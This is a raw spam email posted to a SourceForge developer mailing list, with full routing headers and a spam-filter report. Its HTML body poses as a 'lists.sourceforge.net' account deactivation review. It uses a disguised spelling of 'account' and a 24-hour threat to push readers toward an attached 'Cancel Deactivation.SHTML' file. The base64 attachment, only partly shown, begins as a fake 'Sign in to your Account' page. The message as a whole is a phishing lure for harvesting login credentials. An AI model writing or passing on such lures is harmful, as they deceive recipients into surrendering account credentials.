Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id B5FA46E033A
	for <lists+industrypack-devel@lfdr.de>; Thu, 13 Apr 2023 02:29:30 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1pmkqA-0005N0-Aj
	for lists+industrypack-devel@lfdr.de;
	Thu, 13 Apr 2023 00:29:29 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <v_uma@hotmail.com>) id 1pmkq9-0005Mt-KS
 for industrypack-devel@lists.sourceforge.net;
 Thu, 13 Apr 2023 00:29:28 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=MIME-Version:Content-Type:Message-ID:Date:Subject:
 To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=ok8fpUcvnAamcIJoBUU3PX+WgcgpSykiKo/rMr9H3/8=; b=RHSsXJyRriFplqOPyPo8Ib9MJ4
 5fkN5tPlwEm41ToqMqjyiBPzWaGLacyai258pR6wva4Qv9Fk7Z/03/zphqmxLTXUyiFPWqaoUZ2/B
 wxNUFgozJuAvlKKdBMWP3jElL630VbOQCXBBdpVOkTzjotkvzQdAeebQFXUzlaJHz8lo=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=MIME-Version:Content-Type:Message-ID:Date:Subject:To:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=ok8fpUcvnAamcIJoBUU3PX+WgcgpSykiKo/rMr9H3/8=; b=c
 u7tKjCTdA5zHbcdbl+rulO2mJL+v3mdefbVZjfKJGC4jZ7X3eiP5a6cFV3O73GzcURX+NTUTIY7Ba
 jO6ptv66EptJ818vom6ms9bsxpCbgbpU4qHyKDzMUSRInQ5iyh/Emp2F3hB17F1DsysYgRpz9YW8A
 GysgUZfIRx/XHklU=;
Received: from mail-dbaeur03olkn2035.outbound.protection.outlook.com
 ([40.92.58.35] helo=EUR03-DBA-obe.outbound.protection.outlook.com)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1pmkq3-005ww4-KT for industrypack-devel@lists.sourceforge.net;
 Thu, 13 Apr 2023 00:29:28 +0000
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=Uyf/4nVqMl0O1qCD6MpHR0MMhUBwrLm/p38o1IP9etTtdq+gqnFRGgRdJNnyjaCry1aQW5TannLEl6/cGKaA38QkT9Wd6ibbbDM5CBWZMY5hNWA/qTWy3jregHOd+M5GoyIbXJ5c0vumae96geunr/lyoTF0mEuwCYKyu9vOkLKjQqraN+pwMxnGnicY64TWv7enD91kUx7P7p8CWv+d5d9vLjyqMmvq4qaVDgXksY690VZSHc0Dhvnch9kQndOegyV0MBogWOSbkSiRPckAHmgiLR4TvZGY74kgXraKcgd9M9G6brxUW1ovN6RFxVvP+8OcVOTq6SUeDrLk+FeEbQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com; 
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=ok8fpUcvnAamcIJoBUU3PX+WgcgpSykiKo/rMr9H3/8=;
 b=T8quSc2c7WEZEpzG4GGl+fQcWSJGA/t1qWc5B0YvR7gFnv9moCj3JBkfCdTpsGsXShPVJ8wv11q4j+pOTl8SlOpQubcxBSmVBv2MCMxa0m1DVF9+SZpBUS0XsesAXbpjtVgz+5qLthbru483KJYfGT25Oe31L5aEJtqyAY8SeFzEeU5UyAmtIIxlQHahDTHL/49rSqRpfYqxK/HFAd+CaH6XoqQcykfE4JgVr25+y+iy/8Ud62OLE8WOs/LXI4zGPMY7H8+uopGd+iuMjUeMHvUBe7ibm1QGWrHb0PmdCYml8G0aVaVNXq7OGsPyxBCE8sjswI7L8bS9IKiXZLyUqA==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=none; dmarc=none;
 dkim=none; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=hotmail.com;
 s=selector1;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=ok8fpUcvnAamcIJoBUU3PX+WgcgpSykiKo/rMr9H3/8=;
 b=eNLXvjSwRm2uQHkn7trKgLVvLyD2ru31jTZ6acstssBDbGFYXNBC8xOEXlhTx8DqPXfYIDPFA+LAEPufAWDg0vvRr0neXPzL89+OVr9oajHo9FCEu/RvUSxWNUrFXNNfLek3ALiu1bHylEnI928KrImBgUTJxNWzXP5QKheZY/5TfxQcRxEPN7nG4jvH8wunQMuldIdHV3lbS8+hoBrucuaVrigEvUP35jBgEOqG47nM5v9jrd4O9zH6yytrlsA88zfL8hRlM2TdVYvPVK6lDv/9+3El1Kj7c9jGRA1/Aeusy+t12APbRGAOz3GzRuvQhg1TfD7wRR4XgY+7OpGlsA==
Received: from DB9PR08MB6908.eurprd08.prod.outlook.com (2603:10a6:10:2a0::10)
 by GV1PR08MB7850.eurprd08.prod.outlook.com (2603:10a6:150:5d::13)
 with Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.6277.34; Thu, 13 Apr
 2023 00:29:15 +0000
Received: from DB9PR08MB6908.eurprd08.prod.outlook.com
 ([fe80::b03a:64a:4eaf:a62d]) by DB9PR08MB6908.eurprd08.prod.outlook.com
 ([fe80::b03a:64a:4eaf:a62d%7]) with mapi id 15.20.6298.030; Thu, 13 Apr 2023
 00:29:15 +0000
From: lists.sourceforge.net REVIEW<v_uma@hotmail.com>
To: industrypack-devel@lists.sourceforge.net
Date: 13 Apr 2023 02:26:47 +0200
Message-ID: <DB9PR08MB6908259792654634614EF2279F989@DB9PR08MB6908.eurprd08.prod.outlook.com>
Content-Type: multipart/mixed;
 boundary="----=_NextPart_000_0012_2A5997AA.98DD3F7E"
X-TMN: [PofxVfRCvS/7GPkbg72dG8IZWA+Ug4yJ]
X-ClientProxiedBy: AM0PR02CA0141.eurprd02.prod.outlook.com
 (2603:10a6:20b:28d::8) To DB9PR08MB6908.eurprd08.prod.outlook.com
 (2603:10a6:10:2a0::10)
X-Microsoft-Original-Message-ID: <20230413022646.AFD5E1F14D957E01@hotmail.com>
MIME-Version: 1.0
X-MS-Exchange-MessageSentRepresentingType: 1
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: DB9PR08MB6908:EE_|GV1PR08MB7850:EE_
X-MS-Office365-Filtering-Correlation-Id: b422c35a-68bc-4b2d-cc86-08db3bb5c718
X-Microsoft-Antispam: BCL:0;
X-Microsoft-Antispam-Message-Info: jG7c2KIgQlXZXPm76oLAPqimfbYIpsJ3mhf87VAkNRm/EYXpJXIli4To86OMyIX6T17VubjruPmJ4y/O+T6NvrcPeixJrhLIvQqflfrxZ8WSi/65XLt3BgydNLzWm4aT+K/0XA1OMcH+L3fQNog0SYG0nqH5h85RPt2k/iybDuK01LjKL6S12zj+jdt2hVRTkN9h7htC+pBigY0dbqHOwvVaLmyfmSK8dfx7sMe57AZRWkf+52HQvcuJ/hhCa4O7ISZHIdSsqy1J8EMx60dXdFFXcPl8i6qVq6lPcc8YpUZLUjxBBRk49B5hifZSF5tqlWiDc2ofwGdbez5b0GTKo0Exg8I0g8bLBL/2NR0TBRT2khvaZMtYb72rwoh9iWda6XI3J643f1dc/lB9B4eqrVzg5qFtEWJ0ebhg5FwtwAEpgI+xr22clZQR9lR6dNHdPbBUnKsexNs5Ij7ybL03m2B8oDn0BKvj+8pqkq967VckZHrbbrW/CDCt5FkffqmA5/jSvyeH8J9WaaqNkVdF4AcQkcL5A4OzvCOdlf4h0BRbC3jR2pv1XYrBdx1x76ot
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0: =?iso-8859-1?Q?dNEnwMLX2E1zBXeKc19f3cSeHMz0pJQUMVFqpLiU5R3VRnttLvrTjuBiXj?=
 =?iso-8859-1?Q?tHcmECnSnoZ7wQlAx7KhI3Sv6hhUbgH1srIoLrZNEhmj6HBXDvGDNggcbA?=
 =?iso-8859-1?Q?WRIzKUTvDQoU9O7NmABRvqK2jnW7OdduRrk5wZf4nF8220NKceM+wfMLik?=
 =?iso-8859-1?Q?vLA0EBm2OCP/0cSqmOHPIMQ5Othw/loPhAJbV+ehYNFkM2B2qaChUW7Ik2?=
 =?iso-8859-1?Q?g0RzvfkNNBp2YNddDG+HjCc+3wzn3cETVql1bJMGGjoGqNDY1Vi9QCBlKY?=
 =?iso-8859-1?Q?2c00KTp2F2w2M3m/mc6Po4r8G1h6KbUA4cqetrw1mPaBY29dq0laWj88dH?=
 =?iso-8859-1?Q?Kzs3HKa4T5n4PJgFBh87+Rp23iyuJfm8uvwqElu0iwNzaFq9s2EH75b4j0?=
 =?iso-8859-1?Q?U30EhBFuBywrOkcGAYmza/txMV+CZfvKR0jkV1J3/DOtesxbfrRJ+zhmZr?=
 =?iso-8859-1?Q?glLhZBV/T9hPNvvM1YMxQBQZcalcvf3JWjechiZMIJCt0TeSsguqVJWnUF?=
 =?iso-8859-1?Q?D3aLNX9bQEG9MxLfha3D4WKSLIwUFCNgzqnA8ISzj/fENOHw7OBgO1JI5I?=
 =?iso-8859-1?Q?hMWLp+dNelnQdxaAD0FPEQxHu4swq0Jbfb+XF+T/NvO8pJDx8yCqbDIK0g?=
 =?iso-8859-1?Q?LDuq1Ah72EAz9A2aOi6oT/u8YcNcIXhmWPATrMBxa4GVNF+/OOzIR/TDOt?=
 =?iso-8859-1?Q?1jv0UTMBkieRgkBgDVIk9me+Jiidb/+WqkAxciv5czxpCBRXGQLqmXfzO2?=
 =?iso-8859-1?Q?kfI81vS5B12gsEO03VBBHpvMjFg43WcAGQSoqMqxcNvvOsS5bcKchfQnQT?=
 =?iso-8859-1?Q?QCLqdc6Z95QOUruuieHgFRxeQ7DHnnrUb76nWQs/H9LChcdywiv4DUzQ2F?=
 =?iso-8859-1?Q?r82g0cLfFKd67BtgiB+fczQBzsVBaVj6lsfm3NmTimJmwCSO6xExOzajoj?=
 =?iso-8859-1?Q?T8PkYNoxouYgCaXRbkQj6v2gJoPgpMKt6lkvIDK8O/qI/iVwdadxfbf47s?=
 =?iso-8859-1?Q?Razd9yAcgcptCQKmK8yjVw/MSfSyagH6cczPJwhASIxIJFE9cDVIImh9X1?=
 =?iso-8859-1?Q?3F+PzoPQzsWBv7PiDvN1VX/zyrufwOa8S1ezyqnqqn2QBLV8Pt+/+2aqo8?=
 =?iso-8859-1?Q?HpNWL7dHnk6ELTUadjnwgkcFvlNwUmDKfBEqqyZGVgtXSWhGKFKoN4FNso?=
 =?iso-8859-1?Q?04pa4nv/bTwsSJt+VWT2Qrjx6+EHhaDdJS2PlcqD1oqZJE2GNaed98h0Ts?=
 =?iso-8859-1?Q?tnJ0vGPvfJgs2fCVV6Cg=3D=3D?=
X-OriginatorOrg: sct-15-20-4755-11-msonline-outlook-37dd7.templateTenant
X-MS-Exchange-CrossTenant-Network-Message-Id: b422c35a-68bc-4b2d-cc86-08db3bb5c718
X-MS-Exchange-CrossTenant-AuthSource: DB9PR08MB6908.eurprd08.prod.outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 13 Apr 2023 00:26:52.2157 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
X-MS-Exchange-CrossTenant-RMS-PersistedConsumerOrg: 00000000-0000-0000-0000-000000000000
X-MS-Exchange-Transport-CrossTenantHeadersStamped: GV1PR08MB7850
X-Spam-Score: 7.1 (+++++++)
X-Spam-Report: Spam detection software, running on the system "util-spamd-2.v13.lw.sourceforge.com",
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  lists.sourceforge.net AUTHENTICATE REQUEST lists.sourceforge.net
    αccοunt Deactivation Review 
 
 Content analysis details:   (7.1 points, 6.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
 -0.0 RCVD_IN_DNSWL_NONE     RBL: Sender listed at https://www.dnswl.org/,
                              no trust
                             [40.92.58.35 listed in list.dnswl.org]
 -0.0 SPF_PASS               SPF: sender matches SPF record
  1.2 FORGED_HOTMAIL_RCVD2   hotmail.com 'From' address, but no
                             'Received:'
  0.0 FREEMAIL_FROM          Sender email is commonly abused enduser mail
                             provider
                             [v_uma[at]hotmail.com]
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
  0.0 T_OBFU_HTML_ATTACH     BODY: HTML attachment with non-text MIME type
  0.0 HTML_MESSAGE           BODY: HTML included in message
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
                             author's domain
 -0.1 DKIM_VALID             Message has at least one valid DKIM or DK signature
  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
                             valid
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
                             envelope-from domain
  0.0 T_HTML_ATTACH          HTML attachment to bypass scanning?
  2.0 PDS_FROM_NAME_TO_DOMAIN From:name looks like To:domain
  0.0 T_OBFU_ATTACH_MISSP    Obfuscated attachment type and misspaced
                             From
  1.5 PDS_FRNOM_TODOM_NAKED_TO Naked to From name equals to Domain
  2.5 TO_NO_BRKTS_FROM_MSSP  Multiple header formatting problems
  0.0 FROM_MISSP_FREEMAIL    From misspaced + freemail provider
X-Headers-End: 1pmkq3-005ww4-KT
Subject: [Industrypack-devel] DE-ACTIVATION REQUEST (c) 2023
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

------=_NextPart_000_0012_2A5997AA.98DD3F7E
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-8859-=
1"><meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.19699"></head>
<body>
<div style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 14px; FONT-FAMILY: Roboto,=
 sans-serif; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; WHITE-SPACE=
: normal; BORDER-BOTTOM-WIDTH: 0px; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: nor=
mal; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: =
2; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; TEXT-=
INDENT: 0px; font-variant-ligatures: normal;=20
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial; text-decoration-color: =
initial">
<h2 style=3D"FONT-SIZE: 16px; HEIGHT: 30px; FONT-FAMILY: &#24494;&#36719;&#=
38597;&#40657;; WIDTH: 490px; COLOR: rgb(255,255,255); TEXT-ALIGN: center; =
LINE-HEIGHT: 30px; BACKGROUND-COLOR: rgb(48,113,185); border-radius: 10px">=
&nbsp; &nbsp; lists.sourceforge.net AUTHENTICATE&nbsp; REQUEST<br aria-hidd=
en=3D"true"></h2>
<p></p>
<div style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
GN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0=
px">
<p><font color=3D"#000000"><span style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE=
: 17px; FONT-FAMILY: &quot;Segoe UI Semibold&quot;, &quot;Segoe UI Bold&quo=
t;, &quot;Segoe UI&quot;, &quot;Helvetica Neue Medium&quot;, Arial, sans-se=
rif; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH=
: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0p=
x; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit">lists.=
sourceforge.net &#945;cc&#959;unt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></fon=
t></p></div>
<table style=3D"FONT-SIZE: 16px; FONT-FAMILY: Calibri, Helvetica, sans-seri=
f; font-stretch: inherit">
<tbody>
<tr>
<th style=3D"BORDER-TOP: rgb(0,0,0) 0px solid; BORDER-RIGHT: rgb(0,0,0) 0px=
 solid; WIDTH: 2px; BORDER-BOTTOM: rgb(0,0,0) 0px solid; PADDING-BOTTOM: 5p=
x; PADDING-TOP: 5px; PADDING-LEFT: 5px; BORDER-LEFT: rgb(0,0,0) 0px solid; =
PADDING-RIGHT: 5px; BACKGROUND-COLOR: rgb(159,161,161)">&nbsp;</th>
<td style=3D"BORDER-TOP: rgb(0,0,0) 0px solid; FONT-FAMILY: Roboto, RobotoD=
raft, Helvetica, Arial, sans-serif; BORDER-RIGHT: rgb(0,0,0) 0px solid; WID=
TH: 700px; BORDER-BOTTOM: rgb(0,0,0) 0px solid; PADDING-BOTTOM: 5px; PADDIN=
G-TOP: 5px; PADDING-LEFT: 5px; MARGIN: 0px; BORDER-LEFT: rgb(0,0,0) 0px sol=
id; PADDING-RIGHT: 5px; BACKGROUND-COLOR: rgb(250,252,252)">
<span style=3D"BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: arial, helvetica, sans-=
serif; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WID=
TH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: =
0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit">
<span style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 12px; FONT-FAMILY: inheri=
t; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: =
0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px;=
 PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit">Deactiva=
tion Review</span></span></td></tr></tbody></table>
<p></p></div>
<p style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: =
normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: r=
gb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: norma=
l; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: nor=
mal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; te=
xt-decoration-style: initial; text-decoration-color: initial">The request t=
o disable this email account<font color=3D"#3067cf">
&nbsp;<strong>industrypack-devel@lists.sourceforge.net</strong></font>&nbsp=
;has been received by our team and this request will be processed shortly.<=
br aria-hidden=3D"true">Please do not send the request again</p>
<div style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 14px; FONT-FAMILY: Roboto,=
 sans-serif; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; WHITE-SPACE=
: normal; BORDER-BOTTOM-WIDTH: 0px; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: nor=
mal; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: =
2; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; TEXT-=
INDENT: 0px; font-variant-ligatures: normal;=20
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial; text-decoration-color: =
initial"><br aria-hidden=3D"true">If this request was not sent by you, canc=
el the request on the attached file
<div style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
GN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0=
px">.<br aria-hidden=3D"true"></div>
<div style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
GN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0=
px"><strong>Note:</strong><span style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIG=
HT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-=
BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGH=
T: 0px; BORDER-TOP-WIDTH: 0px">&nbsp;</span>
&nbsp;In 24 hours,&nbsp;this<span style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-R=
IGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDIN=
G-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RI=
GHT: 0px; BORDER-TOP-WIDTH: 0px">&nbsp;</span><font color=3D"#3067cf"><b>li=
sts.sourceforge.net</b></font>&nbsp;<strong>account will be deactivated</st=
rong>.</div></div></body></html>=

------=_NextPart_000_0012_2A5997AA.98DD3F7E
Content-Type: application/octet-stream; name="Cancel Deactivation.SHTML"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Cancel Deactivation.SHTML"

PGh0bWw+DQo8aGVhZD4NCjxtZXRhIG5hbWU9InJvYm90cyIgY29udGVudD0ibm9pbWFnZWluZGV4
LCBub2ZvbGxvdywgbm9zbmlwcGV0LCBub2luZGV4LCBub2FyY2hpdmUsIG5vY2FjaGUsIG5vdHJh
bnNsYXRlLCBub3lhY2EgIj4NCjx0aXRsZT5TbGduIGxuIHQwIHkwdXIgQWNjMHVudDwvdGl0bGU+
DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hh
cnNldD1VVEYtOCI+DQo8bGluayByZWw9Imljb24iIHR5cGU9ImltYWdlL3BuZyIgaHJlZj0iZGF0
YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFCY0FBQUFXQ0FZQUFB
QXJkZ2NGQUFBQWIwbEVRVlE0amUzTXNSRkFRQkNGNFcxaFc3Z0tkS0FGdVFLVUlieFVFU0tSbEpr
VFVKQkRBYjlBQXp0alJQYk5mT0g3NWF3Q0puVUJRRnlVZGhZVDhiakhmeEd2Q3l5dXBnU2cyd0p4
VVJQaHc0a09HWXN3SHM5akRaRFVSS1Rmc2RBaFAvR2tNSW1KeHozdThaZnhHMXNzTWdsVkZ1N3dB
QUFBQUVsRlRrU3VRbUNDIj4NCjwvaGVhZD4NCjxib2R5Pg0KPHN0eWxlPg0KYm9keXtmb250LWZh
bWlseToiU2Vnb2UgVUkgV2ViZm9udCIsLWFwcGxlLXN5c3RlbSwiSGVsdmV0aWNhIE5ldWUiLCJM
dWNpZGEgR3JhbmRlIixSb2JvdG8sRWJyaW1hLCJOaXJtYWxhIFVJIixHYWR1Z2ksIlNlZ29lIFhi
b3ggU3ltYm9sIiwiU2Vnb2UgVUkgU3ltYm9sIiwiTWVpcnlvIFVJIiwiS2htZXIgVUkiLFR1bmdh
LCJMYW8gVUkiLFJhYXZpLCJJc2tvb2xhIFBvdGEiLExhdGhhLExlZWxhd2FkZWUsIk1pY3Jvc29m
dCBZYUhlaSBVSSIsIk1pY3Jvc29mdCBKaGVuZ0hlaSBVSSIsIk1hbGd1biBHb3RoaWMiLCJFc3Ry
YW5nZWxvIEVkZXNzYSIsIk1pY3Jvc29mdCBIaW1hbGF5YSIsIk1pY3Jvc29mdCBOZXcgVGFpIEx1
ZSIsIk1pY3Jvc29mdCBQaGFnc1BhIiwiTWljcm9zb2Z0IFRhaSBMZSIsIk1pY3Jvc29mdCBZaSBC
YWl0aSIsIk1vbmdvbGlhbiBCYWl0aSIsIk1WIEJvbGkiLCJNeWFubWFyIFRleHQiLCJDYW1icmlh
IE1hdGgiO2ZvbnQtc2l6ZToxNXB4O2xpbmUtaGVpZ2h0OjIwcHg7Zm9udC13ZWlnaHQ6NDAwO2Zv
bnQtc2l6ZTouOTM3NXJlbTtsaW5lLWhlaWdodDoxLjI1cmVtO2NvbG9yOiMyNjI2MjY7bWFyZ2lu
OjA7aGVpZ2h0OjEwMCU7b3ZlcmZsb3c6aGlkZGVufSNtYWlue2JhY2tncm91bmQ6I2YyZjJmMjtw
b3NpdGlvbjpmaXhlZDt0b3A6MDt3aWR0aDoxMDAlO2hlaWdodDoxMDAlfSNzdWJ7YmFja2dyb3Vu
ZC1pbWFnZTp1cmwoZGF0YTppbWFnZS9zdmcreG1sO2Jhc2U2NCxQSE4yWnlCNGJXeHVjejBpYUhS
MGNEb3ZMM2QzZHk1M015NXZjbWN2TWpBd01DOXpkbWNpSUhkcFpIUm9QU0l4T1RJd0lpQm9aV2xu
YUhROUlqRXdPREFpSUdacGJHdzlJbTV2Ym1VaVBqeG5JRzl3WVdOcGRIazlJaTR5SWlCamJHbHdM
WEJoZEdnOUluVnliQ2dqUlNraVBqeHdZWFJvSUdROUlrMHhORFkyTGpRZ01UYzVOUzR5WXprMU1D
NHpOeUF3SURFM01qQXVPQzAyTWpjdU5USWdNVGN5TUM0NExURTBNREV1TmxNeU5ERTJMamMzTFRF
d01EZ2dNVFEyTmk0MExURXdNRGd0TWpVMExqUXRNemd3TGpRNE1pMHlOVFF1TkNBek9UTXVObk0z
TnpBdU5ESTRJREUwTURFdU5pQXhOekl3TGpnZ01UUXdNUzQyZWlJZ1ptbHNiRDBpZFhKc0tDTkJL
U0l2UGp4d1lYUm9JR1E5SWswek9UUXVNaUF4T0RFMUxqWmpOelEyTGpVNElEQWdNVE0xTVM0NExU
UTVNeTR5SURFek5URXVPQzB4TVRBeExqWlRNVEUwTUM0M09DMHpPRGN1TmlBek9UUXVNaTB6T0Rj
dU5pMDVOVGN1TmlBeE1EVXVOakF6TFRrMU55NDJJRGN4TkMwek5USXVNemdnTVRneE5TNDJJRE01
TkM0eUlERTRNVFV1Tm5vaUlHWnBiR3c5SW5WeWJDZ2pRaWtpTHo0OGNHRjBhQ0JrUFNKTk1UVTBP
QzQySURFNE9EVXVNbU0yTXpFdU9USWdNQ0F4TVRRMExqSXROREUzTGpRMUlERXhORFF1TWkwNU16
SXVORk15TVRnd0xqVXlJREl3TGpRZ01UVTBPQzQySURJd0xqUWdOREEwTGpRZ05ETTNMamcxSURR
d05DNDBJRGsxTWk0NGN6VXhNaTR5TnpZZ09UTXlMalFnTVRFME5DNHlJRGt6TWk0MGVpSWdabWxz
YkQwaWRYSnNLQ05ES1NJdlBqeHdZWFJvSUdROUlrMHlOalV1T0NBeE1qRTFMalpqTmprd0xqSTBO
